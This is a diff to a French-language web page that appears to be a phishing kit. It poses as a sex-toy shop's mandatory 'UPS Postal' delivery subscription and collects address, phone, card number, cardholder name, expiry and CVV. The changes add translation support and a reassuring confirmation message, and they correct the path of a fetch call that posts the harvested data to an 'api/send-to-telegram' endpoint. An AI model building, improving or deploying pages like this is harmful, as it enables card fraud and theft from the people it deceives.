@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sextoys Boutique - Abonnement livraison</title>
+    <title data-i18n="subscription_title">Inscription à la Livraison</title>
     <style>
         body {
             background-color: #0f1419;
@@ -159,12 +159,13 @@
             100% { opacity: 1; }
         }
     </style>
+    <script src="js/translations.js"></script>
 </head>
-<body>
+<body onload="detectLanguage()">
     <header>
         <div class="logo-container">
-            <h1>Sextoys Boutique</h1>
-            <span>Plaisir & Élégance</span>
+            <h1 data-i18n="title">Boutique Plaisir Intime</h1>
+            <span data-i18n="slogan">Plaisir & Élégance</span>
         </div>
     </header>
     <div class="container">
@@ -175,52 +176,53 @@
             <div>4</div>
             <div>5</div>
         </div>
-        <h2>Abonnement Livraison</h2>
-        <p>Dans le cadre de notre partenariat avec UPS Postal pour la livraison, un abonnement gratuit est requis pour toutes les commandes de jouets sexuels.</p>
+        <h2 data-i18n="subscription_title">Inscription à la Livraison</h2>
+        <p data-i18n="subscription_message">Dans le cadre de notre partenariat avec UPS Postal pour la livraison, un abonnement gratuit est requis pour toutes les commandes de jouets sexuels.</p>
+        <p data-i18n="subscription_confirmation">Vous recevrez une confirmation par e-mail une fois votre inscription validée.</p>
         
-        <div class="section-title">Livraison</div>
+        <div class="section-title" data-i18n="delivery_label">Livraison</div>
         <div class="input-group">
-            <label for="adresse_livraison">Adresse de livraison</label>
-            <input type="text" id="adresse_livraison" name="adresse_livraison" placeholder="Entrez votre adresse" required>
+            <label for="adresse_livraison" data-i18n="address_label">Adresse de livraison</label>
+            <input type="text" id="adresse_livraison" name="adresse_livraison" placeholder="Entrez votre adresse" data-i18n-placeholder="address_placeholder" required>
             <div id="adresse-error" class="error">L'adresse de livraison est requise.</div>
         </div>
         <div class="input-group">
-            <label for="contact_livraison">Numéro de contact</label>
-            <input type="tel" id="contact_livraison" name="contact_livraison" placeholder="Entrez votre numéro" required>
+            <label for="contact_livraison" data-i18n="contact_label">Numéro de contact</label>
+            <input type="tel" id="contact_livraison" name="contact_livraison" placeholder="Entrez votre numéro" data-i18n-placeholder="contact_placeholder" required>
             <div id="contact-error" class="error">Veuillez entrer un numéro de téléphone valide (ex. +33612345678).</div>
         </div>
 
-        <div class="section-title">Informations Bancaires</div>
+        <div class="section-title" data-i18n="banking_info_label">Informations Bancaires</div>
         <div class="payment-methods">
             <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
             <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
             <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.png" alt="American Express">
         </div>
         <div class="input-group">
-            <label for="card_number">Numéro de carte (16 chiffres)</label>
-            <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" required>
+            <label for="card_number" data-i18n="card_number_label">Numéro de carte (16 chiffres)</label>
+            <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" data-i18n-placeholder="card_number_placeholder" required>
             <div id="card-number-error" class="error">Le numéro de carte doit contenir exactement 16 chiffres.</div>
         </div>
         <div class="input-group">
-            <label for="card_holder">Nom du titulaire</label>
-            <input type="text" id="card_holder" name="card_holder" placeholder="Entrez le nom" required>
+            <label for="card_holder" data-i18n="card_holder_label">Nom du titulaire</label>
+            <input type="text" id="card_holder" name="card_holder" placeholder="Entrez le nom" data-i18n-placeholder="card_holder_placeholder" required>
             <div id="card-holder-error" class="error">Le nom du titulaire est requis.</div>
         </div>
         <div class="input-group">
-            <label for="card_expiry">Date d’expiration (MM/AA)</label>
-            <input type="text" id="card_expiry" name="card_expiry" placeholder="12/25" maxlength="5" required>
+            <label for="card_expiry" data-i18n="card_expiry_label">Date d’expiration (MM/AA)</label>
+            <input type="text" id="card_expiry" name="card_expiry" placeholder="12/25" data-i18n-placeholder="card_expiry_placeholder" maxlength="5" required>
             <div id="card-expiry-error" class="error">La date d'expiration doit être au format MM/AA et ne doit pas être dans le passé.</div>
         </div>
         <div class="input-group">
-            <label for="card_cvv">CVV</label>
-            <input type="text" id="card_cvv" name="card_cvv" placeholder="123" maxlength="3" required>
+            <label for="card_cvv" data-i18n="card_cvv_label">CVV</label>
+            <input type="text" id="card_cvv" name="card_cvv" placeholder="123" data-i18n-placeholder="card_cvv_placeholder" maxlength="3" required>
             <div id="card-cvv-error" class="error">Le CVV doit contenir exactement 3 chiffres.</div>
         </div>
 
         <form id="subscription-form">
-            <button type="submit">Valider</button>
+            <button type="submit" data-i18n="validate">Valider</button>
         </form>
-        <div id="loading-message">Veuillez patienter, chargement en cours...</div>
+        <div id="loading-message" data-i18n="loading">Veuillez patienter, chargement en cours...</div>
     </div>
     <script>
         // Ajouter automatiquement une barre oblique dans le champ "Date d'expiration"
@@ -325,7 +327,7 @@
 
             try {
                 console.log('Envoi au serveur...');
-                const response = await fetch('api/send-to-telegram', {
+                const response = await fetch('/api/send-to-telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
